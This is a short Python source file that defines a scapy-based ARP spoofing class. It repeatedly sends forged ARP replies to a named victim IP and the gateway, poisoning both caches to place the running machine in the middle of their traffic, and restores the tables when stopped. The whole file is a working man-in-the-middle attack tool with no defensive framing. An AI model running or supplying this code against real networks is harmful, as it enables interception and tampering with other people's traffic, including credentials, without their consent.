from scapy.all import *
from scapy.layers.l2 import getmacbyip, ARP
import scapy.all as scapy
import time
from getmac import get_mac_address as gma


class ArpSpoofer:
    def __init__(self,targetIP, gatewayIP):
        self.targetIP = targetIP #is Ip address of victim machine
        self.gatewayIP = gatewayIP #is gatewayIP
        self.sourceMAC = gma()
        self.on = True

    def spoofer(self,targetIP, spoofIP):
        """
        sends flase reply packet
        """
        packet = ARP(op=2, pdst=targetIP, hwdst=getmacbyip(targetIP), psrc=spoofIP)
        send(packet, verbose=False)

    def restore(self, destinationIP, sourceIP):
        """
        restores the mac asdresses by sending several packets with the original info
        """
        packet = ARP(op=2, pdst=destinationIP, hwdst=getmacbyip(destinationIP), psrc=sourceIP,
                           hwsrc=getmacbyip(sourceIP))
        send(packet, count=4, verbose=False)

    def start(self):
        """
        sents false responses until on = false. then, it restores the mac adresses.
        """
        print("start arp spoofing")
        packets = 0
        while self.on:
            self.spoofer(self.targetIP, self.gatewayIP)
            self.spoofer(self.gatewayIP, self.targetIP)
            packets += 2
            time.sleep(1)

        self.restore(self.targetIP, self.gatewayIP)
        self.restore(self.gatewayIP, self.targetIP)
        print("stopped arp spoofing")

    def set_on(self, input):
        if input=='stop':
            self.on=False


    
